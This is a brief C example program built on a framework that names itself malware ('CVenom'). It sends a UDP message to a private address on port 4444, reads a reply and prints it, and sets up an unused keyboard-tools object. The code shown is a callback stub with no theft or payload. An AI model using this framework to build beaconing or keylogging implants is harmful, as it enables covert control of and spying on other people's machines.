#include "../CVenom.h"
#include "../MemoryTools.h"
#include "../NetworkTools.h"
#include "../KeyboardTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	MemoryTools	Memory;
	KeyboardTools	Keyboard;
	NetworkTools	Network;

	MemoryBuffer Buffer = Memory.StackAllocate(100);
	Network.UDPSetEndpoint("192.168.1.150", 4444);

	Network.UDPSend("emak");
	Network.UDPReceive(Buffer);

	printf("%s\n", Buffer.data);

	cvexit(MALWARE_EXIT);
}
